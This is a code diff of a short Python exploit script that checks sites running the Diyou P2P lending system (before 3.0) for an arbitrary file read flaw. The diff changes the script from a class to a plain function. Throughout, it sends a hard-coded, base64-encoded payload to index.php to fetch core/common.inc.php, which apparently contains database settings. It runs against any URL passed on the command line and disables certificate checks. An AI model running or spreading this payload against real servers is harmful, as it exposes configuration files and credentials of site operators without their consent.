@@ -9,17 +9,10 @@ description: 帝友P2P3.0以前存在任意文件读取漏洞，可读取数据�
 import sys
 import requests
 import warnings
-  
-
-
-class url_fileread:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['帝友P2P借贷系统任意文件读取漏洞', '', '']
         payload = "/index.php?plugins&q=imgurl&url=QGltZ3VybEAvY29yZS9jb21tb24uaW5jLnBocA=="
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, timeout=10, verify=False)
 
@@ -34,5 +27,4 @@ class url_fileread:
         return result
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = url_fileread(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
